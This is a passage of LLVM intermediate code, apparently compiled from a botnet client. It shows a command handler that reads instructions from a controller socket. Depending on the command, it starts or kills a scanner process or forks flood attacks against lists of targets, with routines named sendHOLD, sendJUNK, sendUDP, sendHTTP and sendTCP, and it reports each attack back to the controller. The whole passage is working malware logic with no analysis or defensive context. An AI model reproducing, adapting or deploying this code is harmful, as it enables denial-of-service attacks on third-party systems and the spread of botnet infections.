  %64 = call i32 (i32, i8*, ...) @sockprintf(i32 %63, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.54, i32 0, i32 0))
  br label %640

; <label>:65:                                     ; preds = %59
  %66 = load i8**, i8*** %4, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 1
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @strcmp(i8* %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.55, i32 0, i32 0)) #10
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %78, label %71

; <label>:71:                                     ; preds = %65
  %72 = load i32, i32* @scanPid, align 4
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %71
  br label %640

; <label>:75:                                     ; preds = %71
  %76 = load i32, i32* @scanPid, align 4
  %77 = call i32 @kill(i32 %76, i32 9) #4
  store i32 0, i32* @scanPid, align 4
  br label %78

; <label>:78:                                     ; preds = %75, %65
  %79 = load i8**, i8*** %4, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 1
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 @strcmp(i8* %81, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.56, i32 0, i32 0)) #10
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %100, label %84

; <label>:84:                                     ; preds = %78
  %85 = load i32, i32* @scanPid, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %84
  br label %640

; <label>:88:                                     ; preds = %84
  %89 = call i32 @fork() #4
  store i32 %89, i32* %5, align 4
  %90 = load i32, i32* %5, align 4
  %91 = icmp ugt i32 %90, 0
  br i1 %91, label %92, label %94

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* %5, align 4
  store i32 %93, i32* @scanPid, align 4
  br label %640

; <label>:94:                                     ; preds = %88
  %95 = load i32, i32* %5, align 4
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %94
  br label %640

; <label>:98:                                     ; preds = %94
  br label %99

; <label>:99:                                     ; preds = %98
  call void @StartTheLelz()
  call void @_exit(i32 0) #12
  unreachable

; <label>:100:                                    ; preds = %78
  br label %101

; <label>:101:                                    ; preds = %100, %53
  %102 = load i8**, i8*** %4, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 0
  %104 = load i8*, i8** %103, align 8
  %105 = call i32 @strcmp(i8* %104, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0)) #10
  %106 = icmp ne i32 %105, 0
  br i1 %106, label %177, label %107

; <label>:107:                                    ; preds = %101
  %108 = load i32, i32* %3, align 4
  %109 = icmp slt i32 %108, 4
  br i1 %109, label %122, label %110

; <label>:110:                                    ; preds = %107
  %111 = load i8**, i8*** %4, align 8
  %112 = getelementptr inbounds i8*, i8** %111, i64 2
  %113 = load i8*, i8** %112, align 8
  %114 = call i32 @atoi(i8* %113) #10
  %115 = icmp slt i32 %114, 1
  br i1 %115, label %122, label %116

; <label>:116:                                    ; preds = %110
  %117 = load i8**, i8*** %4, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 3
  %119 = load i8*, i8** %118, align 8
  %120 = call i32 @atoi(i8* %119) #10
  %121 = icmp slt i32 %120, 1
  br i1 %121, label %122, label %123

; <label>:122:                                    ; preds = %116, %110, %107
  br label %640

; <label>:123:                                    ; preds = %116
  %124 = load i8**, i8*** %4, align 8
  %125 = getelementptr inbounds i8*, i8** %124, i64 1
  %126 = load i8*, i8** %125, align 8
  store i8* %126, i8** %6, align 8
  %127 = load i8**, i8*** %4, align 8
  %128 = getelementptr inbounds i8*, i8** %127, i64 2
  %129 = load i8*, i8** %128, align 8
  %130 = call i32 @atoi(i8* %129) #10
  store i32 %130, i32* %7, align 4
  %131 = load i8**, i8*** %4, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 3
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @atoi(i8* %133) #10
  store i32 %134, i32* %8, align 4
  %135 = load i8*, i8** %6, align 8
  %136 = call i8* @strstr(i8* %135, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %137 = icmp ne i8* %136, null
  br i1 %137, label %138, label %161

; <label>:138:                                    ; preds = %123
  %139 = load i32, i32* @mainCommSock, align 4
  %140 = load i8*, i8** %6, align 8
  %141 = load i32, i32* %7, align 4
  %142 = load i32, i32* %8, align 4
  %143 = call i32 (i32, i8*, ...) @sockprintf(i32 %139, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.58, i32 0, i32 0), i8* %140, i32 %141, i32 %142)
  %144 = load i8*, i8** %6, align 8
  %145 = call i8* @strtok(i8* %144, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %145, i8** %9, align 8
  br label %146

; <label>:146:                                    ; preds = %158, %138
  %147 = load i8*, i8** %9, align 8
  %148 = icmp ne i8* %147, null
  br i1 %148, label %149, label %160

; <label>:149:                                    ; preds = %146
  %150 = call i32 @listFork()
  %151 = icmp ne i32 %150, 0
  br i1 %151, label %158, label %152

; <label>:152:                                    ; preds = %149
  %153 = load i8*, i8** %9, align 8
  %154 = load i32, i32* %7, align 4
  %155 = load i32, i32* %8, align 4
  call void @sendHOLD(i8* %153, i32 %154, i32 %155)
  %156 = load i32, i32* @mainCommSock, align 4
  %157 = call i32 @close(i32 %156)
  call void @_exit(i32 0) #12
  unreachable

; <label>:158:                                    ; preds = %149
  %159 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %159, i8** %9, align 8
  br label %146

; <label>:160:                                    ; preds = %146
  br label %176

; <label>:161:                                    ; preds = %123
  %162 = call i32 @listFork()
  %163 = icmp ne i32 %162, 0
  br i1 %163, label %164, label %165

; <label>:164:                                    ; preds = %161
  br label %640

; <label>:165:                                    ; preds = %161
  %166 = load i32, i32* @mainCommSock, align 4
  %167 = load i8*, i8** %6, align 8
  %168 = load i32, i32* %7, align 4
  %169 = load i32, i32* %8, align 4
  %170 = call i32 (i32, i8*, ...) @sockprintf(i32 %166, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.58, i32 0, i32 0), i8* %167, i32 %168, i32 %169)
  %171 = load i8*, i8** %6, align 8
  %172 = load i32, i32* %7, align 4
  %173 = load i32, i32* %8, align 4
  call void @sendHOLD(i8* %171, i32 %172, i32 %173)
  %174 = load i32, i32* @mainCommSock, align 4
  %175 = call i32 @close(i32 %174)
  call void @_exit(i32 0) #12
  unreachable

; <label>:176:                                    ; preds = %160
  br label %177

; <label>:177:                                    ; preds = %176, %101
  %178 = load i8**, i8*** %4, align 8
  %179 = getelementptr inbounds i8*, i8** %178, i64 0
  %180 = load i8*, i8** %179, align 8
  %181 = call i32 @strcmp(i8* %180, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i32 0, i32 0)) #10
  %182 = icmp ne i32 %181, 0
  br i1 %182, label %253, label %183

; <label>:183:                                    ; preds = %177
  %184 = load i32, i32* %3, align 4
  %185 = icmp slt i32 %184, 4
  br i1 %185, label %198, label %186

; <label>:186:                                    ; preds = %183
  %187 = load i8**, i8*** %4, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 2
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @atoi(i8* %189) #10
  %191 = icmp slt i32 %190, 1
  br i1 %191, label %198, label %192

; <label>:192:                                    ; preds = %186
  %193 = load i8**, i8*** %4, align 8
  %194 = getelementptr inbounds i8*, i8** %193, i64 3
  %195 = load i8*, i8** %194, align 8
  %196 = call i32 @atoi(i8* %195) #10
  %197 = icmp slt i32 %196, 1
  br i1 %197, label %198, label %199

; <label>:198:                                    ; preds = %192, %186, %183
  br label %640

; <label>:199:                                    ; preds = %192
  %200 = load i8**, i8*** %4, align 8
  %201 = getelementptr inbounds i8*, i8** %200, i64 1
  %202 = load i8*, i8** %201, align 8
  store i8* %202, i8** %10, align 8
  %203 = load i8**, i8*** %4, align 8
  %204 = getelementptr inbounds i8*, i8** %203, i64 2
  %205 = load i8*, i8** %204, align 8
  %206 = call i32 @atoi(i8* %205) #10
  store i32 %206, i32* %11, align 4
  %207 = load i8**, i8*** %4, align 8
  %208 = getelementptr inbounds i8*, i8** %207, i64 3
  %209 = load i8*, i8** %208, align 8
  %210 = call i32 @atoi(i8* %209) #10
  store i32 %210, i32* %12, align 4
  %211 = load i8*, i8** %10, align 8
  %212 = call i8* @strstr(i8* %211, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %213 = icmp ne i8* %212, null
  br i1 %213, label %214, label %237

; <label>:214:                                    ; preds = %199
  %215 = load i32, i32* @mainCommSock, align 4
  %216 = load i8*, i8** %10, align 8
  %217 = load i32, i32* %11, align 4
  %218 = load i32, i32* %12, align 4
  %219 = call i32 (i32, i8*, ...) @sockprintf(i32 %215, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.60, i32 0, i32 0), i8* %216, i32 %217, i32 %218)
  %220 = load i8*, i8** %10, align 8
  %221 = call i8* @strtok(i8* %220, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %221, i8** %13, align 8
  br label %222

; <label>:222:                                    ; preds = %234, %214
  %223 = load i8*, i8** %13, align 8
  %224 = icmp ne i8* %223, null
  br i1 %224, label %225, label %236

; <label>:225:                                    ; preds = %222
  %226 = call i32 @listFork()
  %227 = icmp ne i32 %226, 0
  br i1 %227, label %234, label %228

; <label>:228:                                    ; preds = %225
  %229 = load i8*, i8** %13, align 8
  %230 = load i32, i32* %11, align 4
  %231 = load i32, i32* %12, align 4
  call void @sendJUNK(i8* %229, i32 %230, i32 %231)
  %232 = load i32, i32* @mainCommSock, align 4
  %233 = call i32 @close(i32 %232)
  call void @_exit(i32 0) #12
  unreachable

; <label>:234:                                    ; preds = %225
  %235 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %235, i8** %13, align 8
  br label %222

; <label>:236:                                    ; preds = %222
  br label %252

; <label>:237:                                    ; preds = %199
  %238 = call i32 @listFork()
  %239 = icmp ne i32 %238, 0
  br i1 %239, label %240, label %241

; <label>:240:                                    ; preds = %237
  br label %640

; <label>:241:                                    ; preds = %237
  %242 = load i32, i32* @mainCommSock, align 4
  %243 = load i8*, i8** %10, align 8
  %244 = load i32, i32* %11, align 4
  %245 = load i32, i32* %12, align 4
  %246 = call i32 (i32, i8*, ...) @sockprintf(i32 %242, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.60, i32 0, i32 0), i8* %243, i32 %244, i32 %245)
  %247 = load i8*, i8** %10, align 8
  %248 = load i32, i32* %11, align 4
  %249 = load i32, i32* %12, align 4
  call void @sendJUNK(i8* %247, i32 %248, i32 %249)
  %250 = load i32, i32* @mainCommSock, align 4
  %251 = call i32 @close(i32 %250)
  call void @_exit(i32 0) #12
  unreachable

; <label>:252:                                    ; preds = %236
  br label %253

; <label>:253:                                    ; preds = %252, %177
  %254 = load i8**, i8*** %4, align 8
  %255 = getelementptr inbounds i8*, i8** %254, i64 0
  %256 = load i8*, i8** %255, align 8
  %257 = call i32 @strcmp(i8* %256, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.61, i32 0, i32 0)) #10
  %258 = icmp ne i32 %257, 0
  br i1 %258, label %385, label %259

; <label>:259:                                    ; preds = %253
  %260 = load i32, i32* %3, align 4
  %261 = icmp slt i32 %260, 6
  br i1 %261, label %307, label %262

; <label>:262:                                    ; preds = %259
  %263 = load i8**, i8*** %4, align 8
  %264 = getelementptr inbounds i8*, i8** %263, i64 3
  %265 = load i8*, i8** %264, align 8
  %266 = call i32 @atoi(i8* %265) #10
  %267 = icmp eq i32 %266, -1
  br i1 %267, label %307, label %268

; <label>:268:                                    ; preds = %262
  %269 = load i8**, i8*** %4, align 8
  %270 = getelementptr inbounds i8*, i8** %269, i64 2
  %271 = load i8*, i8** %270, align 8
  %272 = call i32 @atoi(i8* %271) #10
  %273 = icmp eq i32 %272, -1
  br i1 %273, label %307, label %274

; <label>:274:                                    ; preds = %268
  %275 = load i8**, i8*** %4, align 8
  %276 = getelementptr inbounds i8*, i8** %275, i64 4
  %277 = load i8*, i8** %276, align 8
  %278 = call i32 @atoi(i8* %277) #10
  %279 = icmp eq i32 %278, -1
  br i1 %279, label %307, label %280

; <label>:280:                                    ; preds = %274
  %281 = load i8**, i8*** %4, align 8
  %282 = getelementptr inbounds i8*, i8** %281, i64 5
  %283 = load i8*, i8** %282, align 8
  %284 = call i32 @atoi(i8* %283) #10
  %285 = icmp eq i32 %284, -1
  br i1 %285, label %307, label %286

; <label>:286:                                    ; preds = %280
  %287 = load i8**, i8*** %4, align 8
  %288 = getelementptr inbounds i8*, i8** %287, i64 5
  %289 = load i8*, i8** %288, align 8
  %290 = call i32 @atoi(i8* %289) #10
  %291 = icmp sgt i32 %290, 65500
  br i1 %291, label %307, label %292

; <label>:292:                                    ; preds = %286
  %293 = load i8**, i8*** %4, align 8
  %294 = getelementptr inbounds i8*, i8** %293, i64 4
  %295 = load i8*, i8** %294, align 8
  %296 = call i32 @atoi(i8* %295) #10
  %297 = icmp sgt i32 %296, 32
  br i1 %297, label %307, label %298

; <label>:298:                                    ; preds = %292
  %299 = load i32, i32* %3, align 4
  %300 = icmp eq i32 %299, 7
  br i1 %300, label %301, label %308

; <label>:301:                                    ; preds = %298
  %302 = load i8**, i8*** %4, align 8
  %303 = getelementptr inbounds i8*, i8** %302, i64 6
  %304 = load i8*, i8** %303, align 8
  %305 = call i32 @atoi(i8* %304) #10
  %306 = icmp slt i32 %305, 1
  br i1 %306, label %307, label %308

; <label>:307:                                    ; preds = %301, %292, %286, %280, %274, %268, %262, %259
  br label %640

; <label>:308:                                    ; preds = %301, %298
  %309 = load i8**, i8*** %4, align 8
  %310 = getelementptr inbounds i8*, i8** %309, i64 1
  %311 = load i8*, i8** %310, align 8
  store i8* %311, i8** %14, align 8
  %312 = load i8**, i8*** %4, align 8
  %313 = getelementptr inbounds i8*, i8** %312, i64 2
  %314 = load i8*, i8** %313, align 8
  %315 = call i32 @atoi(i8* %314) #10
  store i32 %315, i32* %15, align 4
  %316 = load i8**, i8*** %4, align 8
  %317 = getelementptr inbounds i8*, i8** %316, i64 3
  %318 = load i8*, i8** %317, align 8
  %319 = call i32 @atoi(i8* %318) #10
  store i32 %319, i32* %16, align 4
  %320 = load i8**, i8*** %4, align 8
  %321 = getelementptr inbounds i8*, i8** %320, i64 4
  %322 = load i8*, i8** %321, align 8
  %323 = call i32 @atoi(i8* %322) #10
  store i32 %323, i32* %17, align 4
  %324 = load i8**, i8*** %4, align 8
  %325 = getelementptr inbounds i8*, i8** %324, i64 5
  %326 = load i8*, i8** %325, align 8
  %327 = call i32 @atoi(i8* %326) #10
  store i32 %327, i32* %18, align 4
  %328 = load i32, i32* %3, align 4
  %329 = icmp eq i32 %328, 7
  br i1 %329, label %330, label %335

; <label>:330:                                    ; preds = %308
  %331 = load i8**, i8*** %4, align 8
  %332 = getelementptr inbounds i8*, i8** %331, i64 6
  %333 = load i8*, i8** %332, align 8
  %334 = call i32 @atoi(i8* %333) #10
  br label %336

; <label>:335:                                    ; preds = %308
  br label %336

; <label>:336:                                    ; preds = %335, %330
  %337 = phi i32 [ %334, %330 ], [ 10, %335 ]
  store i32 %337, i32* %19, align 4
  %338 = load i8*, i8** %14, align 8
  %339 = call i8* @strstr(i8* %338, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %340 = icmp ne i8* %339, null
  br i1 %340, label %341, label %366

; <label>:341:                                    ; preds = %336
  %342 = load i32, i32* @mainCommSock, align 4
  %343 = load i8*, i8** %14, align 8
  %344 = load i32, i32* %16, align 4
  %345 = call i32 (i32, i8*, ...) @sockprintf(i32 %342, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.62, i32 0, i32 0), i8* %343, i32 %344)
  %346 = load i8*, i8** %14, align 8
  %347 = call i8* @strtok(i8* %346, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %347, i8** %20, align 8
  br label %348

; <label>:348:                                    ; preds = %363, %341
  %349 = load i8*, i8** %20, align 8
  %350 = icmp ne i8* %349, null
  br i1 %350, label %351, label %365

; <label>:351:                                    ; preds = %348
  %352 = call i32 @listFork()
  %353 = icmp ne i32 %352, 0
  br i1 %353, label %363, label %354

; <label>:354:                                    ; preds = %351
  %355 = load i8*, i8** %20, align 8
  %356 = load i32, i32* %15, align 4
  %357 = load i32, i32* %16, align 4
  %358 = load i32, i32* %17, align 4
  %359 = load i32, i32* %18, align 4
  %360 = load i32, i32* %19, align 4
  call void @sendUDP(i8* %355, i32 %356, i32 %357, i32 %358, i32 %359, i32 %360)
  %361 = load i32, i32* @mainCommSock, align 4
  %362 = call i32 @close(i32 %361)
  call void @_exit(i32 0) #12
  unreachable

; <label>:363:                                    ; preds = %351
  %364 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %364, i8** %20, align 8
  br label %348

; <label>:365:                                    ; preds = %348
  br label %384

; <label>:366:                                    ; preds = %336
  %367 = call i32 @listFork()
  %368 = icmp ne i32 %367, 0
  br i1 %368, label %369, label %370

; <label>:369:                                    ; preds = %366
  br label %640

; <label>:370:                                    ; preds = %366
  %371 = load i32, i32* @mainCommSock, align 4
  %372 = load i8*, i8** %14, align 8
  %373 = load i32, i32* %15, align 4
  %374 = load i32, i32* %16, align 4
  %375 = call i32 (i32, i8*, ...) @sockprintf(i32 %371, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.63, i32 0, i32 0), i8* %372, i32 %373, i32 %374)
  %376 = load i8*, i8** %14, align 8
  %377 = load i32, i32* %15, align 4
  %378 = load i32, i32* %16, align 4
  %379 = load i32, i32* %17, align 4
  %380 = load i32, i32* %18, align 4
  %381 = load i32, i32* %19, align 4
  call void @sendUDP(i8* %376, i32 %377, i32 %378, i32 %379, i32 %380, i32 %381)
  %382 = load i32, i32* @mainCommSock, align 4
  %383 = call i32 @close(i32 %382)
  call void @_exit(i32 0) #12
  unreachable

; <label>:384:                                    ; preds = %365
  br label %385

; <label>:385:                                    ; preds = %384, %253
  %386 = load i8**, i8*** %4, align 8
  %387 = getelementptr inbounds i8*, i8** %386, i64 0
  %388 = load i8*, i8** %387, align 8
  %389 = call i32 @strcmp(i8* %388, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.64, i32 0, i32 0)) #10
  %390 = icmp ne i32 %389, 0
  br i1 %390, label %447, label %391

; <label>:391:                                    ; preds = %385
  %392 = load i32, i32* %3, align 4
  %393 = icmp slt i32 %392, 3
  br i1 %393, label %400, label %394

; <label>:394:                                    ; preds = %391
  %395 = load i8**, i8*** %4, align 8
  %396 = getelementptr inbounds i8*, i8** %395, i64 2
  %397 = load i8*, i8** %396, align 8
  %398 = call i32 @atoi(i8* %397) #10
  %399 = icmp slt i32 %398, 1
  br i1 %399, label %400, label %401

; <label>:400:                                    ; preds = %394, %391
  br label %640

; <label>:401:                                    ; preds = %394
  %402 = load i8**, i8*** %4, align 8
  %403 = getelementptr inbounds i8*, i8** %402, i64 1
  %404 = load i8*, i8** %403, align 8
  store i8* %404, i8** %21, align 8
  %405 = load i8**, i8*** %4, align 8
  %406 = getelementptr inbounds i8*, i8** %405, i64 2
  %407 = load i8*, i8** %406, align 8
  %408 = call i32 @atoi(i8* %407) #10
  store i32 %408, i32* %22, align 4
  %409 = load i8*, i8** %21, align 8
  %410 = call i8* @strstr(i8* %409, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %411 = icmp ne i8* %410, null
  br i1 %411, label %412, label %433

; <label>:412:                                    ; preds = %401
  %413 = load i32, i32* @mainCommSock, align 4
  %414 = load i8*, i8** %21, align 8
  %415 = load i32, i32* %22, align 4
  %416 = call i32 (i32, i8*, ...) @sockprintf(i32 %413, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.65, i32 0, i32 0), i8* %414, i32 %415)
  %417 = load i8*, i8** %21, align 8
  %418 = call i8* @strtok(i8* %417, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %418, i8** %23, align 8
  br label %419

; <label>:419:                                    ; preds = %430, %412
  %420 = load i8*, i8** %23, align 8
  %421 = icmp ne i8* %420, null
  br i1 %421, label %422, label %432

; <label>:422:                                    ; preds = %419
  %423 = call i32 @listFork()
  %424 = icmp ne i32 %423, 0
  br i1 %424, label %430, label %425

; <label>:425:                                    ; preds = %422
  %426 = load i8*, i8** %21, align 8
  %427 = load i32, i32* %22, align 4
  call void @sendHTTP(i8* %426, i32 %427)
  %428 = load i32, i32* @mainCommSock, align 4
  %429 = call i32 @close(i32 %428)
  call void @_exit(i32 0) #12
  unreachable

; <label>:430:                                    ; preds = %422
  %431 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %431, i8** %23, align 8
  br label %419

; <label>:432:                                    ; preds = %419
  br label %446

; <label>:433:                                    ; preds = %401
  %434 = call i32 @listFork()
  %435 = icmp ne i32 %434, 0
  br i1 %435, label %436, label %437

; <label>:436:                                    ; preds = %433
  br label %640

; <label>:437:                                    ; preds = %433
  %438 = load i32, i32* @mainCommSock, align 4
  %439 = load i8*, i8** %21, align 8
  %440 = load i32, i32* %22, align 4
  %441 = call i32 (i32, i8*, ...) @sockprintf(i32 %438, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.65, i32 0, i32 0), i8* %439, i32 %440)
  %442 = load i8*, i8** %21, align 8
  %443 = load i32, i32* %22, align 4
  call void @sendHTTP(i8* %442, i32 %443)
  %444 = load i32, i32* @mainCommSock, align 4
  %445 = call i32 @close(i32 %444)
  call void @_exit(i32 0) #12
  unreachable

; <label>:446:                                    ; preds = %432
  br label %447

; <label>:447:                                    ; preds = %446, %385
  %448 = load i8**, i8*** %4, align 8
  %449 = getelementptr inbounds i8*, i8** %448, i64 0
  %450 = load i8*, i8** %449, align 8
  %451 = call i32 @strcmp(i8* %450, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0)) #10
  %452 = icmp ne i32 %451, 0
  br i1 %452, label %586, label %453

; <label>:453:                                    ; preds = %447
  %454 = load i32, i32* %3, align 4
  %455 = icmp slt i32 %454, 6
  br i1 %455, label %498, label %456

; <label>:456:                                    ; preds = %453
  %457 = load i8**, i8*** %4, align 8
  %458 = getelementptr inbounds i8*, i8** %457, i64 3
  %459 = load i8*, i8** %458, align 8
  %460 = call i32 @atoi(i8* %459) #10
  %461 = icmp eq i32 %460, -1
  br i1 %461, label %498, label %462

; <label>:462:                                    ; preds = %456
  %463 = load i8**, i8*** %4, align 8
  %464 = getelementptr inbounds i8*, i8** %463, i64 2
  %465 = load i8*, i8** %464, align 8
  %466 = call i32 @atoi(i8* %465) #10
  %467 = icmp eq i32 %466, -1
  br i1 %467, label %498, label %468

; <label>:468:                                    ; preds = %462
  %469 = load i8**, i8*** %4, align 8
  %470 = getelementptr inbounds i8*, i8** %469, i64 4
  %471 = load i8*, i8** %470, align 8
  %472 = call i32 @atoi(i8* %471) #10
  %473 = icmp eq i32 %472, -1
  br i1 %473, label %498, label %474

; <label>:474:                                    ; preds = %468
  %475 = load i8**, i8*** %4, align 8
  %476 = getelementptr inbounds i8*, i8** %475, i64 4
  %477 = load i8*, i8** %476, align 8
  %478 = call i32 @atoi(i8* %477) #10
  %479 = icmp sgt i32 %478, 32
  br i1 %479, label %498, label %480

; <label>:480:                                    ; preds = %474
  %481 = load i32, i32* %3, align 4
  %482 = icmp sgt i32 %481, 6
  br i1 %482, label %483, label %489

; <label>:483:                                    ; preds = %480
  %484 = load i8**, i8*** %4, align 8
  %485 = getelementptr inbounds i8*, i8** %484, i64 6
  %486 = load i8*, i8** %485, align 8
  %487 = call i32 @atoi(i8* %486) #10
  %488 = icmp slt i32 %487, 0
  br i1 %488, label %498, label %489

; <label>:489:                                    ; preds = %483, %480
  %490 = load i32, i32* %3, align 4
  %491 = icmp eq i32 %490, 8
  br i1 %491, label %492, label %499

; <label>:492:                                    ; preds = %489
  %493 = load i8**, i8*** %4, align 8
  %494 = getelementptr inbounds i8*, i8** %493, i64 7
  %495 = load i8*, i8** %494, align 8
  %496 = call i32 @atoi(i8* %495) #10
  %497 = icmp slt i32 %496, 1
  br i1 %497, label %498, label %499

; <label>:498:                                    ; preds = %492, %483, %474, %468, %462, %456, %453
  br label %640

; <label>:499:                                    ; preds = %492, %489
  %500 = load i8**, i8*** %4, align 8
  %501 = getelementptr inbounds i8*, i8** %500, i64 1
  %502 = load i8*, i8** %501, align 8
  store i8* %502, i8** %24, align 8
  %503 = load i8**, i8*** %4, align 8
  %504 = getelementptr inbounds i8*, i8** %503, i64 2
  %505 = load i8*, i8** %504, align 8
  %506 = call i32 @atoi(i8* %505) #10
  store i32 %506, i32* %25, align 4
  %507 = load i8**, i8*** %4, align 8
  %508 = getelementptr inbounds i8*, i8** %507, i64 3
  %509 = load i8*, i8** %508, align 8
  %510 = call i32 @atoi(i8* %509) #10
  store i32 %510, i32* %26, align 4
  %511 = load i8**, i8*** %4, align 8
  %512 = getelementptr inbounds i8*, i8** %511, i64 4
  %513 = load i8*, i8** %512, align 8
  %514 = call i32 @atoi(i8* %513) #10
  store i32 %514, i32* %27, align 4
  %515 = load i8**, i8*** %4, align 8
  %516 = getelementptr inbounds i8*, i8** %515, i64 5
  %517 = load i8*, i8** %516, align 8
  store i8* %517, i8** %28, align 8
  %518 = load i32, i32* %3, align 4
  %519 = icmp eq i32 %518, 8
  br i1 %519, label %520, label %525

; <label>:520:                                    ; preds = %499
  %521 = load i8**, i8*** %4, align 8
  %522 = getelementptr inbounds i8*, i8** %521, i64 7
  %523 = load i8*, i8** %522, align 8
  %524 = call i32 @atoi(i8* %523) #10
  br label %526

; <label>:525:                                    ; preds = %499
  br label %526

; <label>:526:                                    ; preds = %525, %520
  %527 = phi i32 [ %524, %520 ], [ 10, %525 ]
  store i32 %527, i32* %29, align 4
  %528 = load i32, i32* %3, align 4
  %529 = icmp sgt i32 %528, 6
  br i1 %529, label %530, label %535

; <label>:530:                                    ; preds = %526
  %531 = load i8**, i8*** %4, align 8
  %532 = getelementptr inbounds i8*, i8** %531, i64 6
  %533 = load i8*, i8** %532, align 8
  %534 = call i32 @atoi(i8* %533) #10
  br label %536

; <label>:535:                                    ; preds = %526
  br label %536

; <label>:536:                                    ; preds = %535, %530
  %537 = phi i32 [ %534, %530 ], [ 0, %535 ]
  store i32 %537, i32* %30, align 4
  %538 = load i8*, i8** %24, align 8
  %539 = call i8* @strstr(i8* %538, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %540 = icmp ne i8* %539, null
  br i1 %540, label %541, label %567

; <label>:541:                                    ; preds = %536
  %542 = load i32, i32* @mainCommSock, align 4
  %543 = load i8*, i8** %24, align 8
  %544 = load i32, i32* %26, align 4
  %545 = call i32 (i32, i8*, ...) @sockprintf(i32 %542, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.67, i32 0, i32 0), i8* %543, i32 %544)
  %546 = load i8*, i8** %24, align 8
  %547 = call i8* @strtok(i8* %546, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %547, i8** %31, align 8
  br label %548

; <label>:548:                                    ; preds = %564, %541
  %549 = load i8*, i8** %31, align 8
  %550 = icmp ne i8* %549, null
  br i1 %550, label %551, label %566

; <label>:551:                                    ; preds = %548
  %552 = call i32 @listFork()
  %553 = icmp ne i32 %552, 0
  br i1 %553, label %564, label %554

; <label>:554:                                    ; preds = %551
  %555 = load i8*, i8** %31, align 8
  %556 = load i32, i32* %25, align 4
  %557 = load i32, i32* %26, align 4
  %558 = load i32, i32* %27, align 4
  %559 = load i8*, i8** %28, align 8
  %560 = load i32, i32* %30, align 4
  %561 = load i32, i32* %29, align 4
  call void @sendTCP(i8* %555, i32 %556, i32 %557, i32 %558, i8* %559, i32 %560, i32 %561)
  %562 = load i32, i32* @mainCommSock, align 4
  %563 = call i32 @close(i32 %562)
  call void @_exit(i32 0) #12
  unreachable

; <label>:564:                                    ; preds = %551
  %565 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %565, i8** %31, align 8
  br label %548

; <label>:566:                                    ; preds = %548
  br label %585

; <label>:567:                                    ; preds = %536
  %568 = call i32 @listFork()
  %569 = icmp ne i32 %568, 0
  br i1 %569, label %570, label %571

; <label>:570:                                    ; preds = %567
  br label %640

; <label>:571:                                    ; preds = %567
  %572 = load i32, i32* @mainCommSock, align 4
  %573 = load i8*, i8** %24, align 8
  %574 = load i32, i32* %26, align 4
  %575 = call i32 (i32, i8*, ...) @sockprintf(i32 %572, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.67, i32 0, i32 0), i8* %573, i32 %574)
  %576 = load i8*, i8** %24, align 8
  %577 = load i32, i32* %25, align 4
  %578 = load i32, i32* %26, align 4
  %579 = load i32, i32* %27, align 4
  %580 = load i8*, i8** %28, align 8
  %581 = load i32, i32* %30, align 4
  %582 = load i32, i32* %29, align 4
